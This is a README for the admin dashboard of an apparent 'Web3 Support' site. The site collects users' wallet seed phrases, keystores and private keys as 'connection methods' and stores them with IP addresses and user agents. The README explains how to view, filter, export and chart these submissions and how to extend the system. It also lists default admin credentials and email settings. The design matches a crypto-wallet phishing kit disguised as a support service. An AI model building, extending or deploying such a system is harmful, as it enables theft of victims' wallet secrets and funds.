# Admin Dashboard Documentation

## Overview

The Web3 Support Admin Dashboard provides comprehensive management and monitoring capabilities for your Web3 support platform. It allows administrators to view submissions, monitor analytics, and manage the overall system.

## Features

### 🔐 **Authentication System**
- Secure session-based authentication
- Protected admin routes
- Automatic session expiration (24 hours)
- Default admin credentials for development

### 📊 **Dashboard Overview**
- **Real-time Statistics**: Total submissions, recent activity, unique wallets, categories
- **Visual Analytics**: Charts showing wallet distribution and connection methods
- **Quick Actions**: Export data, refresh stats, manage submissions

### 📋 **Submissions Management**
- **View All Submissions**: Complete list of wallet connection attempts
- **Advanced Filtering**: Search by wallet type, category, status, date range
- **Detailed Information**: IP addresses, user agents, timestamps, wallet data
- **Status Tracking**: Pending, processed, failed submission states
- **Export Functionality**: CSV export for data analysis

### 📈 **Analytics Dashboard**
- **Wallet Distribution**: Bar charts showing popular wallet types
- **Connection Methods**: Pie charts for phrase/keystore/private key usage
- **Category Analytics**: Most requested support categories
- **Time-based Metrics**: Recent activity trends

## Getting Started

### 1. **Access the Admin Portal**

Navigate to `/admin/login` directly in your browser. 

> **🔒 Security Note**: The admin portal is intentionally not linked in the public navigation for security reasons. Bookmark this URL or keep it in secure documentation.

### 2. **Default Login Credentials**

For development/testing:
```
Username: admin
Password: admin123
```

> **⚠️ Security Note**: Change these credentials in production!

### 3. **Dashboard Navigation**

Once logged in, you'll see three main tabs:
- **Overview**: Statistics and charts
- **Submissions**: Detailed submission management
- **Analytics**: Advanced reporting (coming soon)

## API Endpoints

### Authentication
- `POST /api/admin/login` - Admin login
- `POST /api/admin/logout` - Admin logout  
- `GET /api/admin/verify` - Verify session

### Dashboard Data
- `GET /api/admin/dashboard/stats` - Get dashboard statistics
- `GET /api/admin/submissions` - Get paginated submissions
- `GET /api/admin/submissions/:id` - Get specific submission
- `GET /api/admin/users` - Get admin users (placeholder)

## Data Storage

### Submissions Table
```typescript
{
  id: string;           // Unique submission ID
  wallet: string;       // Wallet name (MetaMask, Trust, etc.)
  method: string;       // Connection method (phrase, keystore, privateKey)
  data: object;         // Encrypted wallet credentials
  category: string;     // Support category slug
  categoryTitle: string; // Human-readable category
  timestamp: Date;      // Submission time
  ipAddress: string;    // User's IP address
  userAgent: string;    // Browser/device info
  status: string;       // pending | processed | failed
}
```

### Admin Sessions
```typescript
{
  id: string;
  userId: string;       // Reference to admin user
  sessionToken: string; // Unique session identifier
  expiresAt: Date;      // Session expiration
  createdAt: Date;      // Session creation time
}
```

## Security Features

### 🛡️ **Session Management**
- JWT-like session tokens
- Automatic expiration (24 hours)
- Server-side session validation
- Secure logout functionality

### 🔒 **Authorization**
- Admin-only route protection
- Middleware-based access control
- Role-based permissions (isAdmin flag)

### 📝 **Data Protection**
- IP address logging for audit trails
- User agent tracking for security
- Submission status tracking
- Secure credential handling

## Customization

### Adding New Admin Users

```typescript
// In storage.ts or database
await storage.createUser({
  username: 'newadmin',
  password: 'securepassword', // Hash in production!
  isAdmin: true
});
```

### Extending Dashboard Stats

Add new metrics in `getSubmissionStats()`:

```typescript
// Add custom analytics
const customStats = {
  ...existingStats,
  successRate: processedCount / totalCount,
  averageResponseTime: calculateAverageTime(),
  topCountries: getCountryDistribution()
};
```

### Custom Filters

Extend the submission filters in the dashboard:

```typescript
// Add date range filter
const dateFilter = submissions.filter(sub => 
  new Date(sub.timestamp) >= startDate && 
  new Date(sub.timestamp) <= endDate
);
```

## Production Considerations

### 🔐 **Security Hardening**
1. **Change Default Credentials**: Update admin username/password
2. **Environment Variables**: Store credentials securely
3. **HTTPS Only**: Enable SSL/TLS encryption
4. **Rate Limiting**: Implement login attempt limits
5. **Password Hashing**: Use bcrypt or similar for passwords

### 🗄️ **Database Setup**
1. **PostgreSQL**: Configure production database
2. **Environment Variables**: Set `DATABASE_URL`
3. **Migrations**: Run `npm run db:push`
4. **Backups**: Implement regular database backups

### 📊 **Monitoring**
1. **Error Tracking**: Add Sentry or similar
2. **Analytics**: Implement detailed usage tracking
3. **Performance**: Monitor query performance
4. **Alerts**: Set up notification for critical issues

### 🔧 **Configuration**
```env
# Required Environment Variables
DATABASE_URL=postgresql://user:pass@host:port/db
GMAIL_USER=your-email@gmail.com
GMAIL_APP_PASSWORD=your-app-password
NODE_ENV=production
```

## Troubleshooting

### Common Issues

1. **Session Expired**: Re-login to get new session token
2. **Database Connection**: Verify DATABASE_URL is set
3. **Email Not Sending**: Check Gmail credentials and app password
4. **Charts Not Loading**: Ensure recharts dependency is installed

### Debug Mode

Enable detailed logging by setting:
```env
NODE_ENV=development
DEBUG=true
```

## Future Enhancements

### Planned Features
- [ ] Advanced analytics dashboard
- [ ] User role management
- [ ] Real-time notifications
- [ ] Geographic distribution maps
- [ ] Automated threat detection
- [ ] Custom report generation
- [ ] Integration with external services
- [ ] Mobile-responsive admin app

### API Extensions
- [ ] Bulk submission operations
- [ ] Advanced filtering options
- [ ] Real-time updates via WebSocket
- [ ] Webhook integrations
- [ ] Third-party authentication (OAuth)

## Support

For technical support or feature requests, please:
1. Check this documentation
2. Review the code comments
3. Submit issues via your preferred tracking system
4. Contact the development team

---

**Built with**: React, TypeScript, Express.js, Drizzle ORM, Tailwind CSS, Recharts 